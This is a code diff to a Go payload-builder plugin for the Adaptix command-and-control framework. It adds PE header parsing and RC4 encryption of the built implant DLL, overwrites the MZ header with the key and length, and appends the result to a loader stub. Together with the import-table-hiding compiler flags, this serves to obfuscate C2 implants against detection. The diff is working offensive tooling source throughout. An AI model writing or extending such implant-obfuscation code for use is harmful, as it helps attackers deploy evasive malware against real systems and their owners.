@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"debug/pe"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/hex"
@@ -15,6 +17,7 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"unsafe"
 
 	"github.com/Adaptix-Framework/axc2"
 )
@@ -290,6 +293,29 @@ type GenerateConfig struct {
 	ProxyUsername      string `json:"proxy_username"`
 	ProxyPassword      string `json:"proxy_password"`
 	RotationMode       string `json:"rotation_mode"`
+}
+
+// ImageDosHeader represents the IMAGE_DOS_HEADER structure for PE parsing
+type ImageDosHeader struct {
+	EMagic    uint16
+	ECblp     uint16
+	ECp       uint16
+	ECrlc     uint16
+	ECparhdr  uint16
+	EMinalloc uint16
+	EMaxalloc uint16
+	ESs       uint16
+	ESp       uint16
+	ECsum     uint16
+	EIp       uint16
+	ECs       uint16
+	ELfarlc   uint16
+	EOvno     uint16
+	ERes      [4]uint16
+	EOemid    uint16
+	EOeminfo  uint16
+	ERes2     [10]uint16
+	ELfanew   int32
 }
 
 var (
@@ -592,7 +618,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 
 	// IAT Hiding: -nostdlib eliminates CRT, custom crt.cpp provides replacements
 	if generateConfig.IatHiding {
-		cFlags += " -DIAT_HIDING"
+		cFlags += " -DIAT_HIDING -fno-rtti"
 		lFlags += " -nostdlib -nostartfiles -nodefaultlibs"
 	}
 
@@ -754,7 +780,61 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		if err != nil {
 			return nil, "", err
 		}
-		Payload = append(stubContent, buildContent...)
+
+		// Parse DOS header from DLL
+		var dosHdr ImageDosHeader
+		if err := binary.Read(bytes.NewReader(buildContent), binary.LittleEndian, &dosHdr); err != nil {
+			return nil, "", fmt.Errorf("invalid PE: %w", err)
+		}
+
+		// Compute PE field offsets dynamically
+		eLfanew := uint32(dosHdr.ELfanew)
+		peSignatureSize := uint32(4) // "PE\0\0"
+		oemidOffset := uint32(unsafe.Offsetof(dosHdr.EOemid))
+		var peFileHdr pe.FileHeader
+		tsOffset := eLfanew + peSignatureSize + uint32(unsafe.Offsetof(peFileHdr.TimeDateStamp))
+
+		// Generate 2-byte RC4 key (exclude MZ signature and zero)
+		var rc4KeyVal uint16
+		for {
+			rc4KeyVal = uint16(rand.Uint32() & 0xFFFF)
+			if rc4KeyVal != 0x5A4D && rc4KeyVal != 0x0000 {
+				break
+			}
+		}
+		rc4Key := []byte{byte(rc4KeyVal), byte(rc4KeyVal >> 8)}
+
+		// Save original [2:6] to TimeDateStamp field (before encryption)
+		savedBytes := make([]byte, 4)
+		copy(savedBytes, buildContent[2:6])
+		copy(buildContent[tsOffset:tsOffset+4], savedBytes)
+
+		// Set OEMid flag: 1 = IatHiding (no PE headers), 0 = CRT compatible (with PE headers)
+		if generateConfig.IatHiding {
+			binary.LittleEndian.PutUint16(buildContent[oemidOffset:oemidOffset+2], 1)
+		} else {
+			binary.LittleEndian.PutUint16(buildContent[oemidOffset:oemidOffset+2], 0)
+		}
+
+		// Overwrite [0:2] with RC4 key, [2:6] with encrypted length
+		binary.LittleEndian.PutUint16(buildContent[0:2], rc4KeyVal)
+		encryptedLen := uint32(len(buildContent) - 6)
+		binary.LittleEndian.PutUint32(buildContent[2:6], encryptedLen)
+
+		// RC4 encrypt from offset 6 to end
+		encryptedPart, err := RC4Crypt(buildContent[6:], rc4Key)
+		if err != nil {
+			return nil, "", err
+		}
+
+		// Assemble: [key:2][enc_len:4][encrypted:N]
+		finalPayload := make([]byte, 6, len(buildContent))
+		copy(finalPayload[0:2], rc4Key)
+		binary.LittleEndian.PutUint32(finalPayload[2:6], encryptedLen)
+		finalPayload = append(finalPayload, encryptedPart...)
+
+		Payload = append(stubContent, finalPayload...)
+		
 	} else {
 		Payload = buildContent
 	}
